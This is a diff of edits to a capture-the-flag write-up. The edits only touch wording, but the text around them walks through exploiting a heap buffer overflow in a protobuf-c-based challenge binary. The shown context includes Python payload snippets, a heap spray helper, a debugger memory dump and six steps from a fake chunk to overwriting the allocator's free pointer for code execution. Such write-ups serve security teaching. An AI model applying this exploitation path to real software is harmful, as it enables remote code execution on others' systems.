@@ -166,7 +166,7 @@ message Frame {
 
 So now we have our vulnerability (heap BOF) and the ability to do arbitrary heap allocations, that are freed afterwards!
 
-Also another nice thing is that libprotobuf-c is that it internally uses the `static ProtobufCAllocator protobuf_c__allocator` for making heap allocation which is actually mutable.
+Also another nice thing is that libprotobuf-c internally uses the `static ProtobufCAllocator protobuf_c__allocator` for making heap allocation which is actually mutable.
 
 ```c
 /*
@@ -181,7 +181,7 @@ static ProtobufCAllocator protobuf_c__allocator = {
 };
 ```
 
-and what is even better for us that it is right after our global `g_name` struct:
+and what is even better for us is, that it is right after our global `g_name` struct:
 ```
 00:0000│  0x4e8110 (g_name) ◂— 'mesarthim'
 01:0008│  0x4e8118 (g_name+8) ◂— 0x6d /* 'm' */
@@ -207,7 +207,7 @@ and what is even better for us that it is right after our global `g_name` struct
 
 ## Exploitation
 
-Let's define the following helpers, which will enable us to interact to trigger the buffer overflow, send frames to some heap allocation utilities
+Let's define the following helpers, which will enable us to interact and trigger the buffer overflow as well as do arbitrary heap allocations.
 
 ```python
 inpt_file = open('input', 'wb')
@@ -251,16 +251,16 @@ def send_spray(buf, sprays):
 ```
 
 We will use the following exploitation path:
-1. create a fake valid heap chunk in the above `protobuf_c.allocator`
+1. create a fake valid heap chunk above `protobuf_c.allocator`
 2. corrupt the size of a freed heap chunk
 3. realloc into the chunk and free it (to get the bigger BOF)
 4. corrupt heap ptrs in follow up chunks to get arb unlink
 5. realloc into the arb unlink to corrupt `protobuf_c.allocator`
-6. trigger RCE on unlink
+6. overwrite free and trigger RCE
 
 ```python
 
-# 1. create a fake valid heap chunk in the above protobuf_c.allocator
+# 1. create a fake valid heap chunk above protobuf_c.allocator
 fake = flat({
   8: 0x101,
 }, filler=b"A", length=0x78)
@@ -297,7 +297,7 @@ rce = flat({
 }, filler=b"A", length=0xf0)
 
 send_spray(b'', [rce])
-# 6. trigger RCE on unlink
+# 6. overwrite free and trigger RCE
 
 t.shutdown('send')
 print(ra())
